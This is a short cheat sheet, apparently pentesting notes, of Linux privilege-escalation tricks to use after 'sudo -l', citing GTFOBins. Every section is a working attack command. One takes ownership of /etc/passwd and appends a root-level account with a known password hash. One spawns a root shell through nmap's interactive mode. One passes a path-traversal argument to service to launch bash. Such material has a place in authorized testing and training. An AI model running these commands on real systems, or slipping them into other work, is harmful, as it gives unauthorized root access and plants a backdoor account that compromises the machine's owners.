Tricks to play after running `sudo -l`
https://gtfobins.github.io/

## Chown
```
sudo chown asterisk:asterisk /etc/passwd
echo "flame:sa/zAjIC0QWtk:0:0::/root/:/bin/bash" >> /etc/passwd
su - flame
Password: flamen
```

## nmap
```
sudo nmap --interactive
!sh
```

## service
```
sudo /sbin/service ../../../bin/bash
```
